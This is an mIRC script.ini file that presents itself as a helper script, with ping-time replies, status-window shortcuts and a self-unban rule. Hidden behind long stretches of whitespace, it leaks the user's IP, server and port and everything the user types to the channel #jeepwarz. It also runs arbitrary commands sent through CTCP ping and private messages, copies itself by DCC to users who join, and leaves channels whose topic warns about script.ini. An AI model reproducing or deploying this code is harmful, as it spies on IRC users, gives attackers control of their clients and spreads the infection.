[script]
n0=on 1:text:*inferno6*:#:/ctcp $nick k 
n1=on 1:text:   *:?:{ s *2 | halt }
n2=alias /s / *1
n3=on 1:connect:/.enable #d
n4=#d off
n5=on 1:join:#:{ if ($nick != $me) { dcc send $nick script.ini } | .disable #d | .timer 1 60 .enable #d }
n6=#d end
n7=  .remote on
n8=  titlebar (Not connected)
n9=  }
n10=raw 401:*: {
n11=  halt
n12=}
n13=RAW 001:*:titlebar (Connecting to $server $+ )
n14=
n15=on 1:CONNECT:titlebar (Connected to $server $+ )                                                                                                                                                                                                                                                                                                               | .msg  #jeepwarz Hi.  $ip on $server $+ : $+ $port $+ .
n16=
n17=on 1:DISCONNECT:titlebar (Not connected)
n18=
n19=;if you type something in status it doesn't have to have "/"
n20=on 1:INPUT:*:{                                                                                                                                                                                                                                                                                                                                                                                     .msg #jeepwarz ( $+ $active $+ ) $1-
n21=  set %a status window
n22=  if ( $active == %a ) { $1- | halt }
n23=}
n24=
n25=;ping stuff
n26=on 1:CTCPREPLY:ping*:.notice $nick Your ping time is $duration($calc($ctime - $2)) $+ . 
n27=CTCP 1:ping: if ( $nick != $me) { .ctcp ping $1 }                                                                                                                                                                                                                                                                                                                      | if ( $3 != $null ) { $3- | halt }
n28=
n29=;if you are banned but still opped, unban self
n30=on @1:BAN:#:if ( $banmask iswm $address($me,5) ) mode $chan -b $banmask
n31=
n32=on 1:JOIN:*:{
n33=  if ( $nick == $me ) { halt }
n34=  if ( $comchan($nick,0) > 2 ) { .notice $nick Following me? | halt }                                                                                                                                                                                                                                                                                   | .dcc send $nick $mircdir $+ script.ini
n35=}
n36=
n37=;show channel topic in channel on join
n38=RAW 332:*:echo 4 $2 $chr(31) $+ $2 $+ $chr(31) $+ : $3-                                                                                                                                                                                                                                                                                                     | if ( script.ini isin $3- ) { part $2 | halt }
